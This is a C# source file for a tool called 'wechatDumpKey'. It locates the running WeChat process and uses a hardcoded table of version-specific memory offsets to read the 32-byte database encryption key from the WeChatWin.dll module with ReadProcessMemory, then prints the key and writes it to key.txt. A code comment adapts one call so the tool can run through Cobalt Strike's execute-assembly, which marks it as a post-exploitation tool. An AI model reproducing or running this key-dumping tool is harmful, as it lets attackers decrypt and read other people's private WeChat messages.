using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;

namespace wechatDumpKey
{
    class Program
    {
        public static Boolean Archive = false;
        //inner enum used only internally
        [Flags]
        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId
        );
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        //static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);
        static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, IntPtr th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool Module32NextW(IntPtr hSnapshot, ref MODULEENTRY32 lpme);


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public struct MODULEENTRY32
        {
            internal uint dwSize;
            internal uint th32ModuleID;
            internal uint th32ProcessID;
            internal uint GlblcntUsage;
            internal uint ProccntUsage;
            internal IntPtr modBaseAddr;
            internal uint modBaseSize;
            internal IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            internal string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            internal string szExePath;
        }
        // get the parent process given a pid

        public static IntPtr GetBaseAddr(IntPtr wdBaseAddr, String ver)
        {
            IntPtr basePtr = IntPtr.Zero;
            IntPtr padding = IntPtr.Zero;
            int ver3 = int.Parse(ver.Split('.')[3]);
            if (ver.StartsWith("3.5.0"))
            {
                if (ver3 == 33)
                {
                    padding = (IntPtr)0x21DE374;
                }
                else if (ver3 == 29)
                {
                    padding = (IntPtr)0x21DD334;
                }
            }

            if (ver.StartsWith("3.4.0"))
            {
                if (ver3 == 38)
                {
                    padding = (IntPtr)0x1E2417C;
                }
                else if (ver3 == 54)
                {
                    padding = (IntPtr)0x1E3BBA4;
                }
            }

            if (ver.StartsWith("3.3.5"))
            {
                if (ver3 == 50)
                {
                    padding = (IntPtr)0x1D29B3C;
                }
                else if (ver3 == 42)
                {
                    padding = (IntPtr)0x1D2FB34;
                }
            }
            else if (ver.StartsWith("3.3.0"))
            {
                if (ver3 >= 93 && ver3 <= 115)
                {
                    padding = (IntPtr)0x1DDF914;
                }
            }
            else if (ver.StartsWith("3.2.1"))
            {
                if (ver3 == 141)
                {
                    padding = (IntPtr)0x1AD0D2C;
                }
                if (ver3 >= 154 && ver3 <= 156)
                {
                    padding = (IntPtr)0x1AD1F8C;
                }
                if (ver3 == 132)
                {
                    padding = (IntPtr)0x1ACFD2C;
                }
            }
            else if (ver.StartsWith("3.1.0"))
            {
                padding = (IntPtr)0x18A297C;
            }
            else if (ver.StartsWith("3.0.0"))
            {
                if (ver3 == 57)
                {
                    padding = (IntPtr)0x1856E6C;
                }
                if (ver3 == 47)
                {
                    padding = (IntPtr)0x1856E8C;
                }
            }

            if (ver.StartsWith("2."))
            {
                if (ver.StartsWith("2.9.0"))
                {
                    if (ver3 == 112)
                    {
                        padding = (IntPtr)0x16B4C70;
                    }
                    if (ver3 == 123)
                    {
                        padding = (IntPtr)0x16B4D50;
                    }
                }
                else if (ver.StartsWith("2.9.5"))
                {
                    if (ver3 == 41)
                    {
                        padding = (IntPtr)0x17734A8;
                    }
                    if (ver3 == 56)
                    {
                        padding = (IntPtr)0x17744A8;
                    }
                }

                else if (ver.StartsWith("2.8.0"))
                {
                    padding = (IntPtr)0x161CC50;
                    if (ver3 == 121)
                    {
                        padding = (IntPtr)0x161CC50;
                    }
                    else if (ver3 == 133)
                    {
                        padding = (IntPtr)0x1620D10;
                    }
                    else if (ver3 == 116)
                    {
                        padding = (IntPtr)0x1618BF0;
                    }
                    else if (ver3 == 122)
                    {
                        padding = (IntPtr)0x1618BB0;
                    }
                    else if (ver3 == 106)
                    {
                        padding = (IntPtr)0x1616BF0;
                    }
                }
                else if (ver.StartsWith("2.7.1"))
                {
                    if (ver3 == 85 || ver3 == 82)
                    {
                        padding = (IntPtr)0x13976C0;
                    }
                    if (ver3 == 88)
                    {
                        padding = (IntPtr)0x13976A0;
                    }
                }
                else if (ver.StartsWith("2.6.8"))
                {
                    padding = (IntPtr)0x126DCE0;
                    if (ver3 == 65)
                    {
                        padding = (IntPtr)0x126DCC0;
                    }
                    else if (ver3 == 53 || ver3 == 51)
                    {
                        padding = (IntPtr)0x126DCE0;
                    }
                }
                else if (ver.StartsWith("2.6.7"))
                {
                    padding = (IntPtr)0x125D4B8;
                    if (ver3 == 57)
                    {
                        padding = (IntPtr)0x125D4B8;
                    }
                }
                else if (ver.StartsWith("2.6.6"))
                {
                    padding = (IntPtr)0x1131B64;
                    if (ver3 == 28)
                    {
                        padding = (IntPtr)0x1131B64;
                    }
                }
                else if (ver.StartsWith("2.6.3"))
                {
                    padding = (IntPtr)0x104F42C;
                }
            }
            if (padding != IntPtr.Zero)
            {
                // basePtr = IntPtr.Add(wdBaseAddr, padding.ToInt32()); # .Net 4.0
                basePtr = new IntPtr(wdBaseAddr.ToInt32() + padding.ToInt32());
            }
            else
            {
                Console.WriteLine("[-] This Version Not Support.");
                Environment.Exit(0);
            }
            return basePtr;
        }
        public static void DumpKey(int pid, MODULEENTRY32 ModEntry, String ver, IntPtr wdBaseAddr)
        {
            IntPtr KeyBase = GetBaseAddr(wdBaseAddr, ver);
            IntPtr procHandle = OpenProcess(0x001F0FFF, false, pid);

            if (procHandle == IntPtr.Zero)
            {
                var eCode = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Error code:" + eCode);
            }
            else
            {
                byte[] buffer = new byte[4];
                int bytesread = 0;
                ReadProcessMemory(procHandle, KeyBase, buffer, buffer.Length, ref bytesread);
                if (Marshal.GetLastWin32Error() == 0)
                {
                    Array.Reverse(buffer);
                    IntPtr Pointer = new IntPtr(Convert.ToInt32(BitConverter.ToString(buffer).Replace("-", ""), 16));
                    //Console.WriteLine("[*] Found Key Address:" + Pointer);
                    byte[] keyBuf = new byte[32];
                    ReadProcessMemory(procHandle, Pointer, keyBuf, 32, ref bytesread);
                    //Console.WriteLine("[+] Key:" + BitConverter.ToString(keyBuf).Replace("-", ""));

                    try
                    {
                        String outPutName = "key.txt";
                        String buf = "0x" + BitConverter.ToString(keyBuf).Replace("-", ",0x");
                        Console.WriteLine("----------------Key----------------");
                        Console.WriteLine(buf);

                        Console.WriteLine("-----------------------------------");
                        StreamWriter sr = new StreamWriter(outPutName, false);
                        sr.Write(buf);
                        sr.Flush();
                        sr.Close();

                        Console.WriteLine("[*] Save To File " + outPutName);
                    }
                    catch (IOException e)
                    {
                        Console.WriteLine("[-] " + e.Message + "\n Cannot create DBPass.Bin file.");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error code:" + Marshal.GetLastWin32Error());
                }
                CloseHandle(procHandle);


            }
        }
        public static void OpenWechatProc(int pid)
        {
            IntPtr handleToSnapshot = IntPtr.Zero;
            try
            {
                MODULEENTRY32 ModEntry = new MODULEENTRY32()
                {
                    dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32))
                };
                // handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.All, (uint)pid); #This can't Run in the CobalStrike execute-assembly 
                handleToSnapshot = CreateToolhelp32Snapshot(SnapshotFlags.Module | SnapshotFlags.Module32, (IntPtr)pid);
                if (Module32First(handleToSnapshot, ref ModEntry))
                {

                    List<string> Modules = new List<string>();
                    do
                    {
                        //Modules.Add(ModEntry.hModule.ToString());
                        //Console.WriteLine(ModEntry.szModule + "----Module");
                        if (ModEntry.szModule.Equals("WeChatWin.dll"))
                        {
                            String ver = FileVersionInfo.GetVersionInfo(ModEntry.szExePath).FileVersion;
                            IntPtr wdBaseAddr = ModEntry.modBaseAddr;
                            Console.WriteLine("[*] WeChatWin Version:" + ver);
                            DumpKey(pid, ModEntry, ver, wdBaseAddr);

                        }
                    } while (Module32NextW(handleToSnapshot, ref ModEntry));
                    {
                    }
                }
            }
            catch (Exception ex)
            {
                throw new ApplicationException("[-] Can't get the process.", ex);
            }
            finally
            {
                CloseHandle(handleToSnapshot);
            }

        }



        static void Main(String[] args)
        {
            try
            {
                Process proc = Process.GetProcessesByName("wechat")[0];
                Console.WriteLine("[*] Wechat Process Id:" + proc.Id);
                OpenWechatProc(proc.Id);
                proc.Close();
                Console.WriteLine("[+] Done.");

            }
            catch (IndexOutOfRangeException)
            {
                Console.WriteLine("[-] Wechat Process Not Found.");
            }
            catch (Exception err)
            {
                Console.WriteLine(err);
            }
        }
    }
}
